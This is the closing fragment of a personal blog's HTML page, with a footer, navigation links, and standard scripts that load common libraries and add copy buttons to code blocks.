        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024
    Shen
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
